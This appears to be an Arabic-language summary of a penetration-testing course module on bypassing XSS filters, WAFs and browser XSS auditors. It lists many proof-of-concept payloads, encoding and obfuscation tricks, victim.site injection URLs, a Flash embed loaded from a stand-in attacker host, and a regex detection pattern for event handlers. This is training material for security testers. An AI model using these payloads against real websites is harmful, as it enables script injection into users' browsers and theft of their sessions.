المستند المقدم هو جزء من دورة تدريبية بعنوان **"Web Application Penetration Testing eXtreme" (WAPTXv2)** من شركة Caendra Inc.، تحديدًا من القسم الأول، الوحدة الرابعة بعنوان **"تجاوز مرشحات XSS وتخطي جدران الحماية لتطبيقات الويب (WAF)"**. الهدف من هذه الوحدة هو تعليم تقنيات متقدمة لتجاوز المرشحات الأمنية وجدران الحماية لاستغلال ثغرات **Cross-Site Scripting (XSS)**، وهي نوع من الهجمات التي تسمح للمهاجم بإدخال أكواد خبيثة في صفحات الويب. فيما يلي شرح مفصل باللغة العربية لكل جزء من المستند مع خلاصة بعد كل قسم.

---

### **القسم 4.1: المقدمة**
**الشرح:**
يبدأ هذا القسم بتقديم فكرة تجاوز مرشحات XSS، حيث تُستخدم المرشحات وجدران الحماية (WAF) لمنع الهجمات الخبيثة مثل XSS. يُشير إلى أن العديد من الباحثين الأمنيين طوروا أدلة وموارد لمساعدة مختبري الأمان في اختبار هذه الثغرات. من أبرز هذه الموارد:
- **دليل RSnake لتجاوز مرشحات XSS**: تم تطويره بواسطة RSnake وتتبرع به لاحقًا إلى OWASP (رابط: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
- **دليل أمان HTML5**: تم تطويره بواسطة Cure53 ويركز على ثغرات XSS في HTML5 (رابط: http://html5sec.org/).

الوحدة لا تهدف إلى تحليل كل ناقل هجوم (vector) في هذه الأدلة، بل تركز على السيناريوهات الأكثر شيوعًا التي يواجهها المختبرون:
1. **الحظر**: عندما يتم حظر ناقل XSS بواسطة التطبيق أو جدار الحماية.
2. **التعقيم (Sanitization)**: عندما يتم تعديل الكود الخبيث لجعله غير ضار.
3. **التصفية بواسطة المتصفح**: عندما يمنع المتصفح تنفيذ الكود الخبيث باستخدام مرشحات مدمجة مثل XSS Auditor في Chrome.

**الخلاصة:**
يقدم هذا القسم نظرة عامة عن تجاوز مرشحات XSS ويحدد ثلاثة سيناريوهات رئيسية: الحظر، التعقيم، والتصفية بواسطة المتصفح. كما يُشير إلى موارد مهمة مثل دليل OWASP وHTML5 Security Cheatsheet لفهم تقنيات التجاوز.

---

### **القسم 4.2: تجاوز مرشحات القائمة السوداء (Blacklisting Filters)**
**الشرح:**
مرشحات القائمة السوداء تمنع أنماطًا أو كلمات محددة مثل `<script>` أو `alert`. هذه المرشحات شائعة لسهولة تنفيذها، لكنها غالبًا تحتوي على نقاط ضعف يمكن استغلالها إذا لم تكن شاملة.

#### **4.2.1: إدخال كود السكربت**  { #XSS_Idea_for_script_tag }
تُعتبر علامة `<script>` الطريقة الأساسية لتنفيذ أكواد JavaScript من طرف العميل، وهي أول هدف لمرشحات القائمة السوداء. يمكن تجاوز المرشحات الضعيفة باستخدام تقنيات إبداعية.

##### **4.2.1.1: تجاوز حظر علامة `<script>` الضعيف** 
إذا كانت المرشحات لا تغطي كل الحالات الممكنة، يمكن استخدام التقنيات التالية:
- **تغيير حالة الأحرف**: `<ScRiPt>alert(1);</ScRiPt>` تستخدم أحرفًا كبيرة وصغيرة مختلطة.
- **حذف العلامة الختامية**: `<ScRiPt>alert(1);` بدون `</script>`.
- **إضافة نص عشوائي**: `<script/random>alert(1);</script>` يضيف نصًا غير ذي صلة.
- **إضافة أسطر جديدة**: `<script[سطر جديد]>alert(1);</script>`.
- **العلامات المتداخلة**: `<scr<script>ipt>alert(1)</scr<script>ipt>` تستخدم علامة `<script>` داخل أخرى.
- **بايت الصفر (NULL)**: `<scr\x00ipt>alert(1)</scr\x00ipt>` يعمل في Internet Explorer حتى الإصدار 9.

##### **4.2.1.2: قواعد ModSecurity لعلامة `<script>`**
يستخدم ModSecurity، وهو جدار حماية شائع، قواعد لمنع علامات `<script>` (رابط القاعدة: https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_41_xss_attacks.conf). لكن هذه القواعد ليست شاملة، حيث يمكن استخدام طرق أخرى لتنفيذ الأكواد دون الاعتماد على `<script>`.

##### **4.2.1.3: استخدام خصائص HTML (بدون `<script>`)**
يمكن تنفيذ JavaScript باستخدام خصائص HTML بدلاً من `<script>`، مثل:
- `<a href="javascript:alert(1)">show</a>`: يستخدم بروتوكول `javascript:` في رابط.
- `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>`: يشفر السكربت بـ Base64 باستخدام `data:`.
- `<form action="javascript:alert(1)"><button>send</button></form>`: ينفذ JavaScript عبر خاصية `action` في النموذج.
- `<object data="javascript:alert(1)">` أو `<object data="data:text/html,<script>alert(1)</script>">`: يستخدم علامة `object`.
- `<embed code="//hacker.site/xss.swf" allowscriptaccess=always>`: ينفذ ملف Flash خبيث (رابط: https://github.com/evilcos/xss.swf).

##### **4.2.1.4: HTML**  استخدام أحداث  {  #XSS--ALL--Event--Payload /  #XSS_unique_tags  }
أحداث HTML (مثل `onload`، `onerror`) هي طريقة أخرى لتنفيذ JavaScript. تبدأ هذه الأحداث عادةً بـ `on` متبوعة باسم الحدث. أمثلة تشمل:
- **علامات HTML 4**:
  - `<body onload=alert(1)>`: ينفذ عند تحميل الصفحة.
  - `<img src=x onerror=alert(1)>`: ينفذ عند فشل تحميل الصورة.
  - `<input type=image src=x:x onerror=alert(1)>`: يستخدم مصدر صورة غير صالح.
  - `<isindex onmouseover="alert(1)">`: ينفذ عند تمرير الفأرة.
  - `<form oninput=alert(1)><input></form>`: ينفذ عند تغيير إدخال النموذج.
  - `<textarea autofocus onfocus=alert(1)>`: ينفذ عند تركيز المستخدم على النص.
  - `<input oncut=alert(1)>`: ينفذ عند قص النص.
- **علامات HTML 5**:
  - `<svg onload=alert(1)>`: ينفذ عند تحميل عنصر SVG.
  - `<keygen autofocus onfocus=alert(1)>`: ينفذ عند تركيز المستخدم على `keygen`.
  - `<video><source onerror="alert(1)">`: ينفذ عند فشل مصدر الفيديو.
  - `<marquee onstart=alert(1)>`: ينفذ عند بدء الرسوم المتحركة.

لحظر هذه الأحداث، تستخدم المرشحات تعبيرًا مثل `(on\w+\s*=)`. لكن يمكن تجاوزها باستخدام:
- `<svg/onload=alert(1)>`: إضافة شرطة مائلة.
- `<svg//////onload=alert(1)>`: إضافة عدة شرطات.
- `<svg id=x;onload=alert(1)>`: إضافة خصائص إضافية.
- `<svg id=`x`onload=alert(1)>`: استخدام علامات الاقتباس العكسية.

بعض المتصفحات تسمح بأحرف تحكم (مثل Tab `0x09`، Space `0x20`) بين اسم الحدث وعلامة `=`. يتم سرد الأحرف المسموح بها حسب المتصفح (مثل Chrome يسمح بـ `0x09`، `0x20`، إلخ). يُشار أيضًا إلى أداة Shazzer Fuzz DB لاختبار الأحرف المسموح بها (رابط: http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name و http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name).

يُقترح تعبيرًا أكثر صرامة لحظر الأحداث: 
`(?i)([\s\"'`;\/0-9\=\x00\x09\0A\x0B\x0C\0x0D\x3B\x2C\x28\x3B]+on\w+[\s\x00\x09\0A\x0B\x0C\0x0D\x3B\x2C\x28\x3B]*?=)`.

#### **4.2.2: مرشحات الكلمات المفتاحية** { #ideas_for_url / #XSS_with_out_alret / #XSS_DOM  / #XSS_Obfuscation_payloads  }
تستهدف هذه المرشحات كلمات مثل `alert`، `javascript`، أو `eval`. يمكن تجاوزها باستخدام تقنيات التشفير أو التمويه.

##### **4.2.2.1: التهرب من الأحرف**
تدعم JavaScript أنواعًا مختلفة من التشفير لتجاوز مرشحات الكلمات:
- **التشفير بـ Unicode**:
  - `<script>\u0061lert(1)</script>`: يستخدم `\u0061` لتمثيل `a`.
  - `<script>eval("\u0061lert(1)")</script>`: ينفذ السلسلة المشفرة باستخدام `eval`.
- **التشفير الثماني/السداسي**:
  - `<img src=x onerror="eval('\141lert(1)')"/>`: يستخدم الثماني (`\141` = `a`).
  - `<img src=x onerror="eval('\x61lert(1)')"/>`: يستخدم السداسي (`\x61` = `a`).
- **مرجع الأحرف العددية (NCR)**:
  - `<img src=x onerror="eval('\a\l\ert\(1\)')"/>`: يستخدم أحرف هروب إضافية.
- **التشفير المدمج**:
  - `<img src=x onerror="\u0065val('\141\u006cert\(1)')"/>`: يجمع بين أنواع التشفير.

##### **4.2.2.2: بناء السلاسل**
يمكن بناء السلاسل لتجاوز مرشحات الكلمات:
- `/ale/.source+/rt/.source`: يجمع `ale` و`rt` لتكوين `alert`.
- `String.fromCharCode(97,108,101,114,116)`: ينشئ `alert` باستخدام قيم ASCII.
- `atob("YWxlcnQ=")`: يفك تشفير Base64 لتكوين `alert`.
- `17795081..toString(36)`: يحول الرقم إلى `alert` باستخدام القاعدة 36.

##### **4.2.2.3: أحواض التنفيذ (Execution Sinks)**  
أحواض التنفيذ هي دوال JavaScript التي تحول السلاسل إلى أكواد قابلة للتنفيذ. أمثلة تشمل:
- `setTimeout("JSCode")`: ينفذ الكود بعد تأخير.
- `setInterval("JSCode")`: ينفذ الكود بشكل متكرر.
- `setImmediate("JSCode")`: ينفذ الكود فورًا (في IE 10+).
- `Function("JSCode")`: ينشئ دالة من سلسلة.
- `[].constructor.constructor(alert(1))`: يستخدم باني `Array` أو `Object` لتنفيذ الكود.

(رابط: https://code.google.com/p/domxsswiki/wiki/ExecutionSinks).

##### **4.2.2.4: البروتوكولات الزائفة (Pseudo-Protocols)**
البروتوكولات الزائفة مثل `javascript:`، `data:`، و`vbscript:` تتيح تنفيذ الأكواد في سياقات محددة.

###### **4.2.2.4.1: بروتوكول `javascript:`**
يُستخدم لتنفيذ JavaScript في عناوين URL (مثل `<a href="javascript:alert(1)">`). يمكن تجاوز مرشحات `javascript:` باستخدام:
- تغيير حالة الأحرف: `<object data="JaVaScRiPt:alert(1)">`.
- إضافة مسافات: `<object data="java script:alert(1)">`.
- التشفير: `<object data="javascript:alert(1)">` مع اختلافات في المسافات.

###### **4.2.2.4.2: بروتوكول `data:`**
يسمح بتضمين بيانات في URL، غالبًا مع تشفير Base64 (RFC 2397). أمثلة:
- `<object data="data:text/html,<script>alert(1)</script>">`: يضمن سكربت HTML.
- `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`: يستخدم Base64.
- تجاوز مرشحات `data:` باستخدام `DaTa:` أو اختلافات أخرى.

###### **4.2.2.4.3: بروتوكول `vbscript:`**
خاص بـ Internet Explorer (حتى IE11 في وضع غير Edge). أمثلة:
- `<img src=x onerror="vbscript:msgbox 1"/>`: ينفذ رسالة VBScript (حتى IE8).
- `<img src=x onerror="vbs:alert(3)"/>`: يستخدم الاختصار `vbs:`.
- عدم حساسية الأحرف: `<iMg src=a onErRor="vBsCriPt:AlErT(4)"/>`.
- بايت الصفر: `<img src=x onerror="v�bs�cri pt:alert(1)">`.
- **أداة Script Encoder**: أداة من Microsoft لتشفير VBScript/JScript (مثل `<script language="VBScript.Encode">...`). أدوات عبر الإنترنت مثل Scripts Encryptor متاحة (رابط: http://dennisbabkin.com/screnc/).

**الخلاصة:**
يشرح هذا القسم كيفية تجاوز مرشحات القائمة السوداء باستخدام تقنيات مثل تغيير حالة الأحرف، التشفير (Unicode، ثماني، سداسي)، بناء السلاسل، أحواض التنفيذ، والبروتوكولات الزائفة (`javascript:`، `data:`، `vbscript:`). يركز على استغلال نقاط ضعف المرشحات الضعيفة ويوفر أمثلة عملية لتجاوز علامات `<script>` وأحداث HTML.

---

### **القسم 4.3: تجاوز التعقيم (Sanitization)**
{ #XSS_Idea_for_script_tag   / #with_out_Parentheses_bracket}
**الشرح:**
التعقيم يهدف إلى تحويل المدخلات الخبيثة إلى صيغة غير ضارة (مثل تحويل `<` إلى `<`). لكن التعقيم غير الكامل يمكن أن يُستغل.

#### **4.3.1: التلاعب بالسلاسل**
غالبًا يقوم التعقيم بإزالة أو تشفير كلمات أو علامات معينة، لكن الفحص غير المتكرر (non-recursive) يمكن أن يُستغل.

##### **4.3.1.1: إزالة علامات HTML**
إذا أزال المرشح علامة `<script>` بشكل غير متكرر:
- `<scr<script>ipt>alert(1)</script>`: يزيل المرشح `<script>` الأولى، تاركًا `<script>alert(1)</script>`.
- `<scr<iframe>ipt>alert(1)</script>`: يستخدم `<iframe>` لإرباك الفحص التسلسلي.

يمكن أيضًا دمج هذا مع تقنيات التشفير من القسم 4.2.

##### **4.3.1.2: التهرب من علامات الاقتباس**
عند الإدخال داخل سلاسل مقتبسة (مثل `<script>var key = 'randomkey';</script>`)، قد يضع المرشح شرطة مائلة (`\`) قبل علامات الاقتباس. يمكن تجاوز هذا:
- إدخال `randomkey\' alert(1); //` يتحول إلى `randomkey\\' alert(1); //`، مما يسمح بتنفيذ الكود.
- استخدام `String.fromCharCode(120,115,9416)` لتوليد سلاسل مثل `xss` بدون اقتباسات.
- طرق أخرى تشمل:
  - `/your string/.source`: استخراج السلسلة من تعبير عادي.
  - `43804..toString(36)`: تحويل رقم إلى سلسلة في القاعدة 36.
  - `unescape(/%78%u0073%73/.source)`: فك تشفير سلسلة مشفرة بالـ URL (مهجور لكنه مدعوم في بعض المتصفحات).
  - `decodeURI`/`decodeURIComponent`: فك تشفير سلاسل مشفرة بالـ URL.

##### **4.3.1.3: التهرب من الأقواس**
إذا أزال المرشح الأقواس، يمكن استخدام تقنية اكتشفها Gareth Heyes لتنفيذ دوال بدون أقواس (رابط: http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/):
- تعيين `window.onerror` إلى دالة (مثل `eval`) وإثارة خطأ باستخدام `throw`:
  - `<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">`: ينفذ `alert(1)` بدون أقواس.
  - نسخة مبسطة: `onerror=alert;throw 1;` تعمل في بعض المتصفحات لكنها قد تضيف “Uncaught” إلى الوسائط.

**الخلاصة:**
يوضح هذا القسم كيفية تجاوز التعقيم عبر استغلال الفحص غير المتكرر، التهرب من علامات الاقتباس باستخدام تقنيات مثل `String.fromCharCode`، وتجاوز الأقواس باستخدام `window.onerror` و`throw`. يركز على نقاط ضعف التعقيم غير الكامل.

---

### **القسم 4.4: تجاوز مرشحات المتصفح**
{ #XSS_Idea_for_SVG_tag / #XSS_with_out_angle_bracket / #XSS_Idea_for_script_tag    / #XSS--ALL--Event--Payload / #XSS_DOM}
**الشرح:**
تحتوي المتصفحات الحديثة على مرشحات XSS مدمجة (مثل XSS Auditor في Chrome)، لكنها تركز على XSS المنعكس (Reflected XSS) ولا تغطي كل السيناريوهات.

#### **4.4.1: الإدخال داخل علامات HTML**
ناقل XSS شائع مثل `<svg/onload=alert(1)>` يتم حجبه بواسطة مرشحات المتصفح. لكن حذف علامة `>` (مثل `<svg/onload=alert(1)`) يتجاوز بعض المرشحات مثل XSS Auditor.

#### **4.4.2: الإدخال داخل خصائص علامات HTML**
يمكن تجاوز المرشحات عند الإدخال في خصائص HTML:
- `http://victim.site/inject?x=giuseppe"><svg/onload=alert(1)>`: يغلق الخاصية ويضيف سكربت.
- استخدام `data:`: `http://victim.site/inject?x=giuseppe"><a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">` يتجاوز WebKit.

#### **4.4.3: الإدخال داخل علامات `<script>`**
الإدخال في متغيرات JavaScript (مثل `http://victim.site/inject?name=giuseppe";alert(1);//`) لا يتم تصفيته بواسطة المتصفحات، لأنه يُعتبر مشكلة من جانب الخادم.

#### **4.4.4: الإدخال داخل خصائص الأحداث**
خصائص الأحداث مثل `onclick` لا تُفحص بواسطة مرشحات المتصفح:
- `http://victim.site/inject?roomID=alert(1)` في `<button onclick="reserve(roomID);">` ينفذ السكربت.

#### **4.4.5: XSS المستند إلى DOM**
XSS المستند إلى DOM (مثل `http://victim.site/inject?next=javascript:alert(1)`) لا يتم اكتشافه بواسطة مرشحات المتصفح، لأنه يُعالج من طرف العميل. سيناريوهات أخرى مثل النواقل المجزأة أو XSS المتحور (mXSS) لا تُغطى أيضًا.

**الخلاصة:**
يشرح هذا القسم كيفية تجاوز مرشحات المتصفح باستخدام تقنيات مثل حذف علامات الإغلاق، الإدخال في خصائص HTML، أو استغلال XSS المستند إلى DOM. يركز على قيود المرشحات المدمجة في المتصفحات مثل XSS Auditor.

---
